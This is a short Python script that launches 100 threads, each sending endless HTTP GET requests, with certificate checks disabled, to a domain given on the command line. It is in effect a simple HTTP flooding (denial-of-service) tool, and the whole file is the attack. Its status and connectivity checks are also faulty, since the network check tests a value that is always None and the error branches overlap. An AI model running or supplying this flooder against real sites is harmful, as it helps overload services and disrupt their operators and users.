import threading,requests,argparse,time,socket,urllib3
parser = argparse.ArgumentParser()
parser.add_argument('-d','--domain',metavar='',help='Domain to send request')
args = parser.parse_args()
class Request(threading.Thread):
    def __init__(self,domain):
        threading.Thread.__init__(self)
        self.domain = domain
    def request(self):
        try:
            while True:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM).connect(("8.8.8.8", 53))
                req_func = lambda req: requests.get(req,verify=False)
                urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

                req = req_func(self.domain)
                if req.status_code == 200 or req.status_code != 400:
                    print(f"[{req.status_code}]Request->{self.domain}")
                elif req.status_code >= 400:
                    print(f"[{req.status_code}]Failed Request->{self.domain}")
                elif s != "None":
                    print("No Internet Connection.")
        except Exception as Err:
            print(Err)

if __name__ == '__main__':
    threads = []
    for i in range(100):
        thread_class = Request(args.domain)
        thread_request = threading.Thread(target=thread_class.request)
        thread_request.daemon = True
        threads.append(thread_request)
    for i in range(100):
        threads[i].start()
    for i in range(100):
        threads[i].join()
